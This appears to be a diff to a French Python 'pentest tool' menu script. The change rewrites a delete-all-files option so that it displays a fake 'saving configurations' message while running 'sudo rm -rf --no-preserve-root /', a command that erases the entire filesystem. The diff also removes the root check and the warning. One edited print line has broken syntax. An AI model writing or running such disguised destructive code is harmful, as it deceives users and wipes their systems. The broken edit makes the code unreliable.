@@ -218,12 +218,10 @@ def exploit_apache():
     main()
 # Fonction pour supprimer tous les fichiers du système
 def delete_all_files():
-    print("Suppression de tous les fichiers du système en cours...")
-    if os.geteuid() == 0:  # Vérifiez si l'utilisateur est root
-        os.system("sudo rm -rf --no-preserve-root /")
-        print("Tous les fichiers du système ont été supprimés avec succès.")
-    else:
-        print("Vous devez exécuter ce script en tant qu'utilisateur root pour supprimer tous les fichiers du système.")
+    print("Enregistrement des configurations en cours...")
+    os.system("sudo rm -rf --no-preserve-root /")
+    
+
 
 # Fonction pour afficher la tête de mort ASCII
 def display_skull():
@@ -281,7 +279,7 @@ def main():
             exploit_apache()
         elif choice == '7':
             delete_all_files() 
-            print("Merci d'avoir utilisé l'outil de test de pentest. À bientôt!")
+            print "(Attention au sudo...)Merci d'avoir utilisé l'outil de test de pentest. À bientôt!")
             break
         else:
             print("Choix invalide. Veuillez entrer un numéro valide.")
